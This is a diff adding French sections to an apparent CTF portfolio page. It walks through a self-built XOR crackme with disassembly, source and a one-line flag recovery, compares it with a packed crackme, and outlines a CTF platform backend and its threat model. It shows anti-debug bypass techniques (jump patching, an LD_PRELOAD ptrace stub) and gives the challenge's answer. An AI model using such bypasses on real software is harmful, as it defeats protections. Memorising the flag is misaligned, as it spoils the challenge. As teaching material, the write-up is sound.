+  <pre><code>gcc <span class="kw">-O0</span> <span class="kw">-no-pie</span> <span class="kw">-fno-stack-protector</span> -o crackme-v2 crackme-v2.c</code></pre>
+  <table class="tbl">
+    <thead><tr><th>Flag</th><th>Effet</th><th>Impact sur le reverser</th></tr></thead>
+    <tbody>
+      <tr><td><code>-O0</code></td><td>Aucune optimisation</td><td>Chaque instruction C se mappe 1:1 a l'asm — decompilation lisible</td></tr>
+      <tr><td><code>-no-pie</code></td><td>Adresses fixes (<code>ET_EXEC</code>)</td><td>Pas d'ASLR sur le binaire, adresses deterministes dans le desassemblage</td></tr>
+      <tr><td><code>-fno-stack-protector</code></td><td>Pas de canari</td><td>Simplifie le code de <code>main</code>, pas de <code>__stack_chk_fail</code></td></tr>
+    </tbody>
+  </table>
+  <p>Resultat : un binaire non-PIE, non strippe, sans canari, sans packing — tout est visible a qui ouvre un desassembleur. La difficulte est dans la lecture, pas dans les couches de protection.</p>
+
+  <h3>Imports</h3>
+  <table class="tbl">
+    <thead><tr><th>Fonction</th><th>GLIBC</th><th>Role dans <code>main</code></th></tr></thead>
+    <tbody>
+      <tr><td><code>ptrace</code></td><td>2.2.5</td><td>Anti-debug self-trace (unique call site)</td></tr>
+      <tr><td><code>printf</code></td><td>2.2.5</td><td>Prompt <code>"Enter the flag: "</code></td></tr>
+      <tr><td><code>fgets</code></td><td>2.2.5</td><td>Lit &#x2264; 0x80 octets depuis <code>stdin</code></td></tr>
+      <tr><td><code>strcspn</code></td><td>2.2.5</td><td>Trimme le <code>\n</code> final</td></tr>
+      <tr><td><code>strlen</code></td><td>2.2.5</td><td>Gate de longueur : doit valoir <code>0x16</code> (22)</td></tr>
+      <tr><td><code>puts</code></td><td>2.2.5</td><td>Emet <code>Wrong.</code> ou <code>Correct!</code></td></tr>
+    </tbody>
+  </table>
+  <p>Pas de <code>system</code>, pas d'<code>exec*</code>, pas d'acces fichier — un pur comparateur de chaine.</p>
+
+  <h3>Anti-debug — <code>PTRACE_TRACEME</code></h3>
+  <p>Toute premiere action de <code>main</code>, avant meme le prompt : le processus se met lui-meme sous trace. Un processus n'ayant qu'un seul tracer possible, si <code>gdb</code>/<code>strace</code>/<code>ltrace</code> est deja attache, le noyau renvoie <code>-EPERM</code> et le wrapper libc rend <code>-1</code>.</p>
+  <pre><code><span class="ad">0x40118e</span>  <span class="kw">mov</span>    ecx, 0          <span class="cm">; arg4 = 0</span>
+<span class="ad">0x401193</span>  <span class="kw">mov</span>    edx, 0          <span class="cm">; arg3 = 0 (addr)</span>
+<span class="ad">0x401198</span>  <span class="kw">mov</span>    esi, 0          <span class="cm">; arg2 = 0 (pid, ignore)</span>
+<span class="ad">0x40119d</span>  <span class="kw">mov</span>    edi, 0          <span class="cm">; arg1 = 0 = PTRACE_TRACEME</span>
+<span class="ad">0x4011a2</span>  <span class="kw">mov</span>    eax, 0
+<span class="ad">0x4011a7</span>  <span class="kw">call</span>   <span class="ad">0x401080</span>        <span class="cm">; ptrace@plt</span>
+<span class="ad">0x4011ac</span>  <span class="kw">cmp</span>    rax, -1         <span class="cm">; deja trace ?</span>
+<span class="ad">0x4011b0</span>  <span class="kw">jne</span>    <span class="ad">0x4011bc</span>        <span class="cm">; non &rarr; continue vers le prompt</span>
+<span class="ad">0x4011b2</span>  <span class="kw">mov</span>    eax, 0          <span class="cm">; oui &rarr; return 0</span>
+<span class="ad">0x4011b7</span>  <span class="kw">jmp</span>    <span class="ad">0x4012dd</span>        <span class="cm">; &rarr; leave; ret (exit silencieux)</span></code></pre>
+  <div class="note warn">
+    <span class="lbl">Le tell est une absence</span>
+    Sous debugger, le binaire sort avec le code 0 <b>avant d'afficher <code>"Enter the flag: "</code></b> — pas de banniere « je t'ai detecte », pas de SIGTRAP, rien. Le signal le plus utile est l'absence de prompt : le reflexe « je le lance juste sous gdb » est puni par un binaire qui a l'air casse. Bypass : transformer le <code>jne</code> en <code>jmp</code> inconditionnel, patcher <code>cmp rax,-1</code> en <code>-2</code>, ou <code>LD_PRELOAD</code> un stub <code>ptrace</code> qui rend 0.
+  </div>
+
+  <h3>Code source — le coeur du challenge</h3>
+  <p>Puisque c'est un crackme que j'ai ecrit, voici le fragment central du source (le binaire est compile a partir de ce code exact) :</p>
+  <pre><code><span class="cm">/* crackme-v2.c — extrait */</span>
+<span class="kw">unsigned char</span> encoded[22] = {
+    <span class="ad">0x24</span>, <span class="ad">0x2E</span>, <span class="ad">0x23</span>, <span class="ad">0x25</span>, <span class="ad">0x39</span>, <span class="ad">0x20</span>, <span class="ad">0x76</span>, <span class="ad">0x20</span>,
+    <span class="ad">0x3B</span>, <span class="ad">0x30</span>, <span class="ad">0x27</span>, <span class="ad">0x34</span>, <span class="ad">0x21</span>, <span class="ad">0x2A</span>, <span class="ad">0x76</span>, <span class="ad">0x2E</span>,
+    <span class="ad">0x2E</span>, <span class="ad">0x70</span>, <span class="ad">0x72</span>, <span class="ad">0x70</span>, <span class="ad">0x76</span>, <span class="ad">0x3F</span>
+};
+
+<span class="kw">if</span> (strlen(input) != 22) { puts(<span class="st">"Wrong."</span>); <span class="kw">return</span> 1; }
+
+<span class="kw">for</span> (<span class="kw">int</span> i = 0; i &lt; 22; i++) {
+    <span class="kw">if</span> ((input[i] ^ <span class="ad">0x42</span>) != encoded[i]) {
+        puts(<span class="st">"Wrong."</span>); <span class="kw">return</span> 1;
+    }
+}
+puts(<span class="st">"Correct!"</span>);</code></pre>
+  <p>La contrainte de conception : <b>aucun <code>flag{</code> en clair dans <code>.rodata</code></b> — verifie par <code>strings crackme-v2 | grep 'flag{'</code> au build. La cle <code>0x42</code> apparait directement dans l'instruction <code>xor eax, 0x42</code> du binaire compile — c'est voulu pour la solvabilite.</p>
+
+  <h3>Le ciphertext est inline, pas dans <code>.rodata</code></h3>
+  <p>Apres lecture (<code>fgets</code> &#x2264; 0x80, <code>strcspn</code> pour trimmer le <code>\n</code>), <code>main</code> materialise les 22 octets attendus <b>en immediats</b> via trois <code>movabs</code> — il n'y a aucun blob a grepper dans <code>.rodata</code> :</p>
+  <pre><code><span class="ad">0x40121b</span>  <span class="kw">movabs</span> rax, <span class="ad">0x2076203925232e24</span>   <span class="cm">; octets 0..7</span>
+<span class="ad">0x401225</span>  <span class="kw">movabs</span> rdx, <span class="ad">0x2e762a213427303b</span>   <span class="cm">; octets 8..15</span>
+<span class="ad">0x40122f</span>  <span class="kw">mov</span>    [rbp-0xb0], rax          <span class="cm">; store 0..7</span>
+<span class="ad">0x401236</span>  <span class="kw">mov</span>    [rbp-0xa8], rdx          <span class="cm">; store 8..15</span>
+<span class="ad">0x40123d</span>  <span class="kw">movabs</span> rax, <span class="ad">0x3f767072702e2e76</span>   <span class="cm">; octets 14..21</span>
+<span class="ad">0x401247</span>  <span class="kw">mov</span>    [rbp-0xa2], rax          <span class="cm">; store 14..21 — CHEVAUCHE les 2 derniers !</span></code></pre>
+  <div class="note warn">
+    <span class="lbl">Piege de lecture — le chevauchement</span>
+    Le troisieme store vise <code>rbp-0xa2</code> = <code>(rbp-0xb0) + 14</code> : il recouvre volontairement les 2 derniers octets (<code>0x2e 0x76</code>) du second qword pour placer les 8 octets finaux sans ecrire un 6-octets a part. Les deux ecritures sont identiques au recouvrement, donc la mise en page finale est non ambigue — mais qui lit le buffer lineairement sans faire le depliage little-endian se trompe. Octets bruts obtenus :
+    <br><code>242e2325392076203b302734212a762e2e707270763f</code>
+  </div>
+  <p class="small">Ces memes octets sont aussi visibles a <code>strings</code> comme les fragments <code>$.#%9 v </code> / <code>;0'4!*v.</code> / <code>v..prpv?</code> — utile pour reperer le cipher avant meme de desassembler.</p>
+
+  <h3>La cle XOR</h3>
+  <p>La boucle de verification itere <code>i = 0..0x15</code> (22 tours, coherent avec le gate <code>strlen == 0x16</code> juste au-dessus) et compare <code>input[i] ^ 0x42</code> a <code>expected[i]</code> :</p>
+  <pre><code><span class="ad">0x401279</span>  <span class="kw">mov</span>    DWORD PTR [rbp-4], 0     <span class="cm">; i = 0</span>
+<span class="ad">0x401280</span>  <span class="kw">jmp</span>    <span class="ad">0x4012c3</span>                <span class="cm">; &rarr; test de boucle</span>
+<span class="ad">0x401282</span>  <span class="kw">mov</span>    eax, [rbp-4]             <span class="cm">; eax = i</span>
+<span class="ad">0x401287</span>  <span class="kw">movzx</span>  eax, BYTE PTR [rbp+rax-0x90]  <span class="cm">; input[i]</span>
+<span class="ad">0x40128f</span>  <span class="kw">xor</span>    eax, 0x42                <span class="cm">; CLE = 0x42</span>
+<span class="ad">0x401292</span>  <span class="kw">movsx</span>  edx, al
+<span class="ad">0x40129a</span>  <span class="kw">movzx</span>  eax, BYTE PTR [rbp+rax-0xb0]  <span class="cm">; expected[i]</span>
+<span class="ad">0x4012a5</span>  <span class="kw">cmp</span>    edx, eax                 <span class="cm">; input[i]^0x42 == expected[i] ?</span>
+<span class="ad">0x4012a7</span>  <span class="kw">je</span>     <span class="ad">0x4012bf</span>                <span class="cm">; match &rarr; iteration suivante</span>
+<span class="ad">0x4012a9</span>  <span class="kw">lea</span>    rax, [rip+0xd67]         <span class="st">; "Wrong."</span>  <span class="cm">&rarr; puts, exit(1)</span>
+<span class="ad">0x4012bf</span>  <span class="kw">add</span>    DWORD PTR [rbp-4], 1     <span class="cm">; i++</span>
+<span class="ad">0x4012c3</span>  <span class="kw">cmp</span>    DWORD PTR [rbp-4], 0x15  <span class="cm">; i &lt;= 21 ? &rarr; boucle</span>
+<span class="ad">0x4012c9</span>  <span class="kw">lea</span>    rax, [rip+0xd4e]         <span class="st">; "Correct!"</span></code></pre>
+  <p>Cle constante, mono-octet, aucun salt par position : XOR etant son propre inverse, la recuperation est un one-liner.</p>
+  <pre><code>python3 -c <span class="st">"print(bytes(b^0x42 for b in bytes.fromhex('242e2325392076203b302734212a762e2e707270763f')).decode())"</span>
+<span class="cm"># &rarr; flag{b4byrevch4ll2024}</span></code></pre>
+  <div class="result"><span class="t">Flag</span> flag{b4byrevch4ll2024}</div>
+  <p class="small">Verifie contre le binaire : entree correcte &rarr; <code>Enter the flag: Correct!</code> (rc=0) ; controle negatif <code>wrong</code> &rarr; <code>Wrong.</code> (rc=1) — pour prouver que la boucle se declenche vraiment et qu'on ne lit pas un chemin mort.</p>
+
+  <div class="note">
+    <span class="lbl">Cote conception — la QA a rattrape des erreurs</span>
+    Concevoir un crackme demande sa propre discipline. La specification initiale annoncait 21 caracteres au lieu de 22, et le blob encode contenait des octets errones. Une relecture a recalcule le blob correct (<code>24 2E 23 25 ...</code>, 22 octets), corrige les bornes <code>strlen == 22</code> / boucle <code>i &lt; 22</code>, et defini trois tests de build obligatoires : (1) <code>strings crackme-v2 | grep 'flag{'</code> doit rendre vide (pas de fuite en clair), (2) <code>echo 'flag{b4byrevch4ll2024}' | ./crackme-v2</code> doit afficher <code>Correct!</code>, (3) <code>echo 'wrong' | ./crackme-v2</code> doit afficher <code>Wrong.</code>. Si l'un echoue, le binaire est casse — on corrige et on reteste. La rigueur du build est aussi importante que la rigueur du reverse.
+  </div>
+
+  <h3>Comparaison des deux crackmes</h3>
+  <table class="tbl">
+    <thead><tr><th>Axe</th><th>Crackme #1 (packe)</th><th>Crackme #2 (XOR)</th></tr></thead>
+    <tbody>
+      <tr><td>Difficulte</td><td>4/5</td><td>2/5</td></tr>
+      <tr><td>Temps estime</td><td>30-60 min</td><td>5-10 min</td></tr>
+      <tr><td>Packing</td><td>UPX 4.2.2 <code>--best</code></td><td>Aucun</td></tr>
+      <tr><td>Symboles</td><td>Strippes</td><td>Conserves (<code>main</code>)</td></tr>
+      <tr><td>PIE</td><td>Oui</td><td>Non (<code>ET_EXEC</code>)</td></tr>
+      <tr><td>Anti-debug</td><td><code>/proc/self/status</code> TracerPid</td><td><code>ptrace(PTRACE_TRACEME)</code></td></tr>
+      <tr><td>Encodage</td><td>XOR <code>0x37</code> (chaines) + hash Feistel</td><td>XOR <code>0x42</code> (flag)</td></tr>
+      <tr><td>Leurre</td><td>Branche « Almost... »</td><td>Aucun</td></tr>
+      <tr><td>Cle</td><td><code>FLAG-CTFX</code></td><td><code>flag{b4byrevch4ll2024}</code></td></tr>
+    </tbody>
+  </table>
+  <p>Le gradient de difficulte est delibere : le #2 sert d'entree de gamme, le #1 monte la marche avec quatre couches empilees. Concevoir les deux a permis de calibrer la difficulte perceptive — ce qui bloque un debutant vs. ce qui bloque un intermediaire.</p>
+
+  <!-- ================================================================ -->
+  <!-- SECTION 04 — Hexgate CTF platform                               -->
+  <!-- ================================================================ -->
+
+  <h2><span class="n">04</span> Hexgate — le backend d'une plateforme CTF (je construis aussi l'infra)</h2><div class="rule"></div>
+  <p>Resoudre et concevoir des challenges, c'est un versant ; les <b>heberger proprement</b> en est un autre. Hexgate est le backend d'une petite plateforme CTF que j'ai concu : une application <b>FastAPI</b> mono-conteneur (port 8080), SQLite en persistance, sans frontend — API JSON pure. C'est un projet <b>distinct</b> du travail de resolution ci-dessus, et je le presente comme tel : ici je porte la casquette « plateforme », pas « solveur ».</p>
+
+  <table class="tbl">
+    <thead><tr><th>Brique</th><th>Ce qu'elle fait</th></tr></thead>
+    <tbody>
+      <tr><td>Auth</td><td>register / login / <code>/me</code>, mots de passe <b>bcrypt</b> (cost 12), JWT HS256 (exp 24 h)</td></tr>
+      <tr><td>Challenges</td><td>liste des defis visibles, detail, pieces jointes</td></tr>
+      <tr><td>Soumission de flag</td><td>hash + comparaison, points, enregistrement du solve, <b>first-blood</b></td></tr>
+      <tr><td>Rate limit</td><td>fenetre glissante en memoire : <b>5 tentatives / user / challenge / minute</b> &rarr; 429</td></tr>
+      <tr><td>Scoreboard</td><td>classement global (somme des points, departage par horodatage)</td></tr>
+      <tr><td>Admin</td><td>CRUD des challenges, bascule de visibilite, journal d'audit des tentatives</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Architecture et endpoints</h3>
+  <p>Application mono-process servie par uvicorn, modele de donnees en SQLModel (<code>User</code>, <code>Challenge</code>, <code>Solve</code>, <code>FlagAttempt</code>), routes prefixees <code>/api/v1</code>, un compte admin seede au premier demarrage, healthcheck <code>/health</code>, volume monte pour persister la base entre redemarrages.</p>
+  <table class="tbl">
+    <thead><tr><th>Methode</th><th>Route</th><th>Auth</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td>POST</td><td><code>/auth/register</code></td><td>aucune</td><td>Inscription</td></tr>
+      <tr><td>POST</td><td><code>/auth/login</code></td><td>aucune</td><td>Connexion, retourne JWT</td></tr>
+      <tr><td>GET</td><td><code>/auth/me</code></td><td>JWT</td><td>Profil courant</td></tr>
+      <tr><td>GET</td><td><code>/challenges</code></td><td>JWT</td><td>Liste des defis visibles</td></tr>
+      <tr><td>POST</td><td><code>/challenges/{id}/submit</code></td><td>JWT + rate limit</td><td>Soumettre un flag</td></tr>
+      <tr><td>GET</td><td><code>/scoreboard</code></td><td>aucune</td><td>Classement global</td></tr>
+      <tr><td>POST</td><td><code>/admin/challenges</code></td><td>Admin</td><td>Creer un challenge</td></tr>
+      <tr><td>DELETE</td><td><code>/admin/challenges/{id}</code></td><td>Admin</td><td>Supprimer un challenge</td></tr>
+      <tr><td>GET</td><td><code>/admin/flag-attempts</code></td><td>Admin</td><td>Journal d'audit</td></tr>
+    </tbody>
+  </table>
+
+  <div class="note warn">
+    <span class="lbl">Threat model livre avec</span>
+    Comme pour tout ce que je construis, j'ai passe le design au fil du threat modeling. Points saillants : (1) comparaison de flag en temps constant (<code>secrets.compare_digest</code> / bcrypt) pour eviter la fuite par <b>side-channel temporel</b> ; (2) rate-limit en memoire non partage entre workers &rarr; imposer <code>--workers 1</code> et documenter le caractere non-HA ; (3) <code>JWT_SECRET</code> et <code>ADMIN_KEY</code> forts, rotables ; (4) <b>pepper</b> (<code>FLAG_PEPPER</code>) sur le hash de flag pour bloquer le pre-calcul ; (5) validation des noms de fichiers uploades contre le <code>../</code> path traversal ; (6) pas de stack traces en prod (<code>debug=False</code>) ; (7) SQLite en mode WAL pour gerer les ecritures concurrentes ; (8) pas de verification d'email / captcha a l'inscription — documente comme risque d'abus, hors scope du mini-CTF mais note dans l'audit.
+  </div>
+
+  <!-- ================================================================ -->
+  <!-- SECTION Bilan                                                    -->
+  <!-- ================================================================ -->
 
   <h2><span class="n">Bilan</span></h2><div class="rule"></div>
   <ul>
-    <li><b>Exploitation binaire</b> : lecture de pile, contournement d'absence de protections, ret2win.</li>
-    <li><b>Anti-protection</b> : dé-packing, anti-debug, VM d'obfuscation.</li>
-    <li><b>Outillage</b> : automatiser la génération et la résolution — penser en producteur autant qu'en solveur.</li>
+    <li><b>Exploitation binaire</b> : lecture de pile, contournement d'absence de protections, ret2win — et surtout la partie souvent oubliee : porter le bon <b>jeton d'acces</b> (le wrapper SSH) et gerer le <b>timing du pipe</b> pour ne pas perdre le shell.</li>
+    <li><b>Anti-protection</b> : de-packing UPX, defaite d'anti-debug (<code>/proc/self/status</code> TracerPid, <code>PTRACE_TRACEME</code>), desobfuscation de chaines XOR, reverse d'un hash Feistel maison, et reperage d'une <b>branche leurre</b>.</li>
+    <li><b>Producteur autant que solveur</b> : je concois mes propres crackmes (design des couches de defense, choix des constantes, QA du ciphertext, verification des bornes et des blobs encodes) puis je les casse a froid. Les concevoir apprend autant que les resoudre — on comprend une protection en la construisant, et on calibre la difficulte en la cassant.</li>
+    <li><b>Jusqu'a l'infra</b> : avec Hexgate, la meme exigence cote plateforme — auth bcrypt, rate limiting, first-blood, scoreboard — livree avec son threat model et son architecture documentee.</li>
+    <li><b>Discipline de notes</b> : chaque cible a sa fiche (metadonnees, adresses cles, pieges, one-liner de recuperation). Le processus de QA (correction du blob encode, verification des 3 cas de test au build) fait partie de la livraison.</li>
   </ul>
 </article>
 
